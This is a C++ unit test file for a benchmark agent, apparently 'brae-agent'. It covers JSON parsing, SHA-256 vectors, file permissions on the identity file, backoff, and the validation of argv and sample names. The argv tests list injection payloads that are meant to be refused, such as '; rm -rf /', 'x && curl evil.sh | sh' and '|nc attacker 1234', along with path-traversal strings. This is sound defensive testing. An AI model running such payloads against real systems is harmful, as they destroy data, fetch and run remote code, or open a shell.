// brae-agent unit tests: JSON, SHA-256, the identity file, sample-name validation, argv construction, backoff.
//
// Plain C++17, no CUDA, no network, no GPU -- the same constraint the agent itself is built under, so these run
// anywhere including a CI box with no driver. The heaviest weight is on argvFor(): it is the boundary that
// decides what a compromised orchestrator could make a contributor's machine do.
#include "backoff.h"
#include "identity.h"
#include "jobs.h"
#include "json.h"
#include "sha256.h"

#include <cstdio>
#include <cstdlib>
#include <string>
#include <sys/stat.h>
#include <unistd.h>

using namespace brae::node;

static int failures = 0;

static void check(bool cond, const std::string& what)
{
    if (cond) { std::printf("ok:   %s\n", what.c_str()); return; }
    std::printf("FAIL: %s\n", what.c_str());
    ++failures;
}

static void checkEq(const std::string& got, const std::string& want, const std::string& what)
{
    if (got == want) { std::printf("ok:   %s\n", what.c_str()); return; }
    std::printf("FAIL: %s\n        got:  %s\n        want: %s\n", what.c_str(), got.c_str(), want.c_str());
    ++failures;
}

// ---- JSON ---------------------------------------------------------------------------------------------------

static void testJson()
{
    Json j = Json::object();
    j.set("node_id", Json::str("brae-7f21"));
    j.set("accepts_jobs", Json::boolean(false));
    j.set("percent", Json::num(91));
    checkEq(j.dump(), R"({"node_id":"brae-7f21","accepts_jobs":false,"percent":91})", "json: object dump");

    // Integers must not print as 91.0 -- the API's int-typed fields would reject that.
    checkEq(Json::num(24576).dump(), "24576", "json: integral numbers have no decimal point");

    checkEq(Json::str("say \"hi\"\n\tnow").dump(), R"("say \"hi\"\n\tnow")", "json: escaping");
    checkEq(jsonEscape(std::string("\x01")), "\\u0001", "json: control characters escape as \\u");

    Json parsed;
    std::string err;
    check(Json::parse(R"({"a":{"b":[1,2,{"c":"d"}]},"e":true,"f":null})", parsed, err), "json: parse nested");
    checkEq(parsed["a"]["b"][2]["c"].asString(), "d", "json: nested lookup");
    check(parsed["e"].asBool(), "json: bool round-trip");
    check(parsed["f"].isNull(), "json: null round-trip");
    check(parsed["nope"].isNull(), "json: missing key is null, not a crash");
    check(parsed["a"]["b"][99].isNull(), "json: out-of-range index is null");
    check(parsed["a"].asString("dflt") == "dflt", "json: wrong-typed read falls back");

    // Malformed input is refused rather than half-accepted: a reply we cannot read is one we must not act on.
    for (const char* bad : {"{", "{\"a\":}", "[1,2", "\"unterminated", "{\"a\":1}x", "nul", "{'a':1}", ""})
        check(!Json::parse(bad, parsed, err), std::string("json: refuses ") + (*bad ? bad : "(empty)"));

    // A hostile reply must not recurse the stack into a crash.
    std::string deep(Json::kMaxDepth + 5, '[');
    check(!Json::parse(deep, parsed, err), "json: refuses input nested past the depth limit");
    check(err.find("nested deeper") != std::string::npos, "json: says why it refused deep nesting");

    check(!Json::parse(std::string(Json::kMaxInput + 1, 'a'), parsed, err), "json: refuses oversized input");

    checkEq(Json::parse(R"("café")", parsed, err) ? parsed.asString() : "", "caf\xc3\xa9",
            "json: \\u escapes decode to UTF-8");
}

// ---- SHA-256 ------------------------------------------------------------------------------------------------

static void testSha256()
{
    // FIPS 180-4 vectors.
    checkEq(sha256Hex(""), "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "sha256: empty string");
    checkEq(sha256Hex("abc"), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
            "sha256: abc");
    checkEq(sha256Hex("abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"),
            "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1", "sha256: 448-bit message");
    // Crosses the padding boundary, where a length bug hides.
    checkEq(sha256Hex(std::string(64, 'a')),
            "ffe054fe7ae0cb6dc65c3af9b61d5209f439851db43d0ba5997337df154668eb", "sha256: exactly one block");
    check(sha256Hex("GPU-1d2f3a4b").size() == 64, "sha256: output is 64 hex chars");
}

// ---- sample names -------------------------------------------------------------------------------------------

static void testSampleNames()
{
    for (const char* good : {"pimplefoam/pitzDaily-1M", "simplefoam/mrf-rotatingCylinders",
                             "pitzDaily-12k", "a", "a.b_c-d/e"})
        check(validSampleName(good), std::string("sample name accepts ") + good);

    // Everything here would either escape the cache directory or be read as an option.
    for (const char* bad : {"", "../../etc", "pimplefoam/../../etc", "/etc/passwd", "pimplefoam//x",
                            "pimplefoam/", "/leading", "-rf", "pimplefoam/.hidden", "has space",
                            "semi;colon", "dollar$sign", "back\\slash", "pipe|char", "new\nline"})
        check(!validSampleName(bad), std::string("sample name refuses ") + (*bad ? bad : "(empty)"));

    check(!validSampleName(std::string(97, 'a')), "sample name refuses an over-long name");
}

// ---- argv: the security boundary ------------------------------------------------------------------------------

static void testArgv()
{
    JobRequest job;
    job.jobId = "job-0182";
    job.type = JobType::BraeBenchmark;
    job.sample = "pimplefoam/pitzDaily-1M";

    ArgvResult r = argvFor(job, "/usr/local/bin/brae");
    check(r.ok, "argv: a valid benchmark job is accepted");
    check(r.argv.size() == 3, "argv: exactly three arguments");
    checkEq(r.argv[0], "/usr/local/bin/brae", "argv: argv[0] is the brae binary");
    checkEq(r.argv[1], "benchmark", "argv: the verb is a constant");
    checkEq(r.argv[2], "pimplefoam/pitzDaily-1M", "argv: the sample is the only variable part");

    // An unknown type is refused outright. The server adding a job type must not make old agents run it.
    job.type = JobType::Unknown;
    check(!argvFor(job, "/usr/local/bin/brae").ok, "argv: refuses an unknown job type");
    checkEq(jobTypeFromString("brae-benchmark") == JobType::BraeBenchmark ? "yes" : "no", "yes",
            "argv: the one known type parses");
    check(jobTypeFromString("shell") == JobType::Unknown, "argv: an invented type does not parse");
    check(jobTypeFromString("") == JobType::Unknown, "argv: an empty type does not parse");

    // The attack this file exists to prevent: a sample name that is really a command or a path.
    job.type = JobType::BraeBenchmark;
    for (const char* attack : {"; rm -rf /", "$(id)", "`id`", "../../../etc/shadow", "--help",
                               "x && curl evil.sh | sh", "|nc attacker 1234"})
    {
        job.sample = attack;
        const ArgvResult bad = argvFor(job, "/usr/local/bin/brae");
        check(!bad.ok, std::string("argv: refuses sample ") + attack);
        check(bad.argv.empty(), "argv: refused jobs produce no argv at all");
    }

    job.sample = "pimplefoam/pitzDaily-1M";
    check(!argvFor(job, "").ok, "argv: refuses to run with no brae binary configured");
}

// ---- identity -----------------------------------------------------------------------------------------------

static void testIdentity()
{
    char dir[] = "/tmp/brae-agent-testXXXXXX";
    if (!mkdtemp(dir)) { std::printf("FAIL: cannot create temp dir\n"); ++failures; return; }
    const std::string path = std::string(dir) + "/node.json";

    IdentityResult missing = loadIdentity(path);
    check(!missing.ok, "identity: an absent file is not an error state, just 'not registered'");
    check(missing.error.find("not registered") != std::string::npos, "identity: says the machine is unregistered");

    Identity id;
    id.nodeId = "brae-7f21";
    id.nodeToken = "brae_nt_supersecrettoken";
    id.apiUrl = "https://api.brae.sh";
    id.registeredAt = "2026-07-29T12:00:00Z";

    std::string err;
    check(saveIdentity(path, id, err), "identity: writes");

    struct stat st {};
    ::stat(path.c_str(), &st);
    check((st.st_mode & 07777) == 0600, "identity: written 0600");

    IdentityResult back = loadIdentity(path);
    check(back.ok, "identity: reads back");
    checkEq(back.identity.nodeId, id.nodeId, "identity: node id round-trips");
    checkEq(back.identity.nodeToken, id.nodeToken, "identity: token round-trips");
    checkEq(back.identity.apiUrl, id.apiUrl, "identity: api url round-trips");

    // A token any local user can read is not a secret, so a loose mode is a refusal.
    ::chmod(path.c_str(), 0644);
    IdentityResult loose = loadIdentity(path);
    check(!loose.ok, "identity: refuses a world-readable identity file");
    check(loose.error.find("0600") != std::string::npos, "identity: says how to fix the mode");
    check(loose.error.find(id.nodeToken) == std::string::npos, "identity: the error does not echo the token");
    ::chmod(path.c_str(), 0600);

    // Corrupt content is reported without quoting the file back at the log.
    FILE* f = std::fopen(path.c_str(), "w");
    std::fputs("{\"node_id\":\"brae-7f21\"}", f);
    std::fclose(f);
    ::chmod(path.c_str(), 0600);
    IdentityResult partial = loadIdentity(path);
    check(!partial.ok, "identity: refuses an identity missing the token");
    check(partial.error.find("node_token") != std::string::npos, "identity: names the missing fields");

    f = std::fopen(path.c_str(), "w");
    std::fputs("not json at all", f);
    std::fclose(f);
    ::chmod(path.c_str(), 0600);
    check(!loadIdentity(path).ok, "identity: refuses malformed JSON");

    check(!saveIdentity(path, Identity{}, err), "identity: refuses to write an incomplete identity");

    check(removeIdentity(path, err), "identity: removes");
    check(removeIdentity(path, err), "identity: removing an absent file is not an error");
    ::rmdir(dir);
}

// ---- backoff ------------------------------------------------------------------------------------------------

static void testBackoff()
{
    check(resultBackoffSeconds(0) == 2, "backoff: first retry at 2s");
    check(resultBackoffSeconds(1) == 4, "backoff: doubles");
    check(resultBackoffSeconds(2) == 8, "backoff: doubles again");
    check(resultBackoffSeconds(5) == 60, "backoff: reaches the cap");
    check(resultBackoffSeconds(100) == 60, "backoff: stays at the cap, never overflows");
    check(resultBackoffSeconds(-1) == 2, "backoff: a negative attempt is treated as the first");

    // The server suggests an interval; the agent decides. A bugged or hostile control plane must not be able to
    // turn every contributor's machine into a request flood, nor silently take a node off the live page.
    check(clampSnapshotInterval(10) == 10, "interval: a sane value passes through");
    check(clampSnapshotInterval(0) == 5, "interval: zero is clamped up");
    check(clampSnapshotInterval(-99) == 5, "interval: negative is clamped up");
    check(clampSnapshotInterval(3600) == 60, "interval: an hour is clamped down");
}

int main()
{
    testJson();
    testSha256();
    testSampleNames();
    testArgv();
    testIdentity();
    testBackoff();

    if (failures == 0) std::printf("PASS: brae-agent unit tests\n");
    else std::printf("FAILED: %d check(s)\n", failures);
    return failures == 0 ? 0 : 1;
}
